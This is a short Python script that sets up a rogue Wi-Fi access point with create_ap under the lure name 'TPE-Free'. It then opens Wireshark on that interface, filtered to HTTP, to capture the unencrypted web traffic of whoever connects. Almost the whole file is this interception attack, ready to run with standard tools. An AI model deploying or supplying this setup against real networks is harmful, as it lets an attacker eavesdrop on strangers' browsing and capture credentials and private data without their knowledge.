import subprocess
import sys
import shlex
import time
from utils import search_ifaces

def start_rogueAP(wlan_id, ethernet_id):
    ws_filters = str('"http"')
    ap_command = str(f"x-terminal-emulator -e 'sudo create_ap --no-virt -m nat {wlan_id} {ethernet_id} TPE-Free'")
    ws_command = str(f"x-terminal-emulator -e 'sudo wireshark -k -i {wlan_id} -Y {ws_filters} '")
    #print(wlan_id, ethernet_id)
    subprocess.Popen(shlex.split(ap_command))
    #    Wait 10 seconds for AP to be fully initialized
    time.sleep(10)
    
    subprocess.Popen(shlex.split(ws_command))

def main():
    interfaces = search_ifaces()
    ethernet = interfaces["ethernet"]
    wlan = interfaces["wireless"]
    start_rogueAP(wlan, ethernet)

if __name__ == "__main__":
    main()
